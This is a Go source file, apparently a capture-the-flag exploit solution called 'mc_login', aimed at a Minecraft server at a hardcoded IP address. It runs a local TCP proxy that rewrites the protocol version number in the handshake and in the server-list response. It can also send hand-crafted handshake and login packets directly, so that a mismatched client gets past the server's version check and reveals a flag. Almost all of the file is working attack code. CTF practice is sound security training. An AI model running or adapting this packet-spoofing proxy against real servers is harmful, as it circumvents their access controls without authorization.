/**
* @Author: impakho
* @Date: 2020/04/12
* @Github: https://github.com/impakho
*/

package main

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

const COPYRIGHT_AUTHOR = "impakho"
const COPYRIGHT_DATE = "2020/04/12"
const COPYRIGHT_GITHUB = "https://github.com/impakho"

// PLEASE MODIFY THIS
const MINECRAFT_ADDR = "134.175.230.10:25565"
const LOCAL_PROXY_LISTEN_ADDR = "127.0.0.1:25565"
const PLAYER_NAME = "Steve"

const DEBUG = false
var listener net.Listener

func main() {
	fmt.Println("[mc_login] exploit")
	fmt.Println("Please modify the config in this file.")
	if DEBUG {
		SolutionOne()
		return
	}
	if len(os.Args) < 2 {
		log.Fatal("Use args -s1 / -s2 to choose a solution.")
	}
	if os.Args[1] == "-s1" {
		// Solution One
		SolutionOne()
	}else if os.Args[1] == "-s2" {
		// Solution Two
		SolutionTwo()
	}else{
		log.Fatal("No such solution.")
	}
}

func SolutionOne() {
	fmt.Println(fmt.Sprintf("Use Minecraft 1.12 to connect %s", LOCAL_PROXY_LISTEN_ADDR))
	fmt.Println("Press TAB to view the player list in the game. There is FLAG ONE.")
	StartLocalProxy()
}

func SolutionTwo() {
	conn, err := net.Dial("tcp", MINECRAFT_ADDR)
	if err != nil {
		return
	}
	go func() {
		for {
			buff := make([]byte, 4096)
			n ,err := conn.Read(buff)
			if err != nil {
				conn.Close()
				break
			}
			buff = buff[:n]
			fmt.Println(hex.Dump(buff))
		}
	}()
	var data []byte

	data = Handshake()
	conn.Write(data)
	fmt.Println(hex.Dump(data))

	data = LoginStart()
	conn.Write(data)
	fmt.Println(hex.Dump(data))

	select{}
}

func ParseAddr(addr string) (ip string, port uint16, err error) {
	sep := strings.Split(addr, ":")
	tip := net.ParseIP(sep[0])
	tport, err := strconv.Atoi(sep[1])
	if tip == nil || err != nil || tport < 1 || tport > 65535 {
		return ip, port, errors.New("invalid addr format")
	}
	return tip.String(), uint16(tport), nil
}

func Handshake() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Handshake
	id := []byte{0x00}
	protocol_version := VarInt(997).Encode()
	ip, port, err := ParseAddr(MINECRAFT_ADDR)
	if err != nil {
		return nil
	}
	server_address := String(ip).Encode()
	server_port := UnsignedShort(port).Encode()
	state := []byte{0x02}
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, protocol_version...)
	pkt = append(pkt, server_address...)
	pkt = append(pkt, server_port...)
	pkt = append(pkt, state...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func LoginStart() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Login_Start
	id := []byte{0x00}
	name := String(PLAYER_NAME).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, name...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func StartLocalProxy() {
	var err error
	listener, err = net.Listen("tcp", LOCAL_PROXY_LISTEN_ADDR)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("local proxy started.")
	AcceptTCPConn()
}

func AcceptTCPConn() {
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go HandleTCPConn(conn)
	}
}

func HandleTCPConn(conn net.Conn) {
	rconn, err := net.Dial("tcp", MINECRAFT_ADDR)
	if err != nil {
		conn.Close()
		return
	}
	go func() {
		replacement := false
		for {
			buff := make([]byte, 4096)
			n ,err := conn.Read(buff)
			if err != nil {
				rconn.Close()
				conn.Close()
				break
			}
			buff = buff[:n]
			// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Handshake
			if !replacement && bytes.Contains(buff, append([]byte{0x00}, VarInt(335).Encode()...)) {
				buff = bytes.Replace(buff, append([]byte{0x00}, VarInt(335).Encode()...), append([]byte{0x00}, VarInt(997).Encode()...), -1)
				replacement = true
			}
			rconn.Write(buff)
		}
	}()
	replacement := false
	for {
		buff := make([]byte, 4096)
		n ,err := rconn.Read(buff)
		if err != nil {
			rconn.Close()
			conn.Close()
			break
		}
		buff = buff[:n]
		// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Response / https://wiki.vg/Server_List_Ping#Response
		if !replacement && bytes.Contains(buff, []byte("\"protocol\":997}")) {
			buff = bytes.Replace(buff, []byte("\"protocol\":997}"), []byte("\"protocol\":335}"), -1)
			replacement = true
		}
		conn.Write(buff)
	}
}